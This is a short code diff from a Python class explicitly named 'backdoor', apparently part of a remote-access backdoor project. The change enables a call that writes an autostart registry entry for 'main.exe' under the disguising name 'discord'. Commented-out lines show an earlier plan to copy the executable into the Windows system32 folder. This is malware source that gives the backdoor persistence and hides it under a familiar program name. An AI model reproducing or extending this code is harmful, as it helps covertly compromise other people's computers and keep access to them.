@@ -8,7 +8,7 @@ class backdoor:
         #     #os.chdir(hard_drive_name+":/windows/system32")
         #     shutil.copy("main.exe", hard_drive_name+":/windows/system32/main.exe")
 
-        # self.set_autostart_registry('discord', hard_drive_name+':/windows/system32/main.exe')
+        self.set_autostart_registry('discord', 'main.exe')
 
         self.db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
         self.cursor = self.db.cursor()
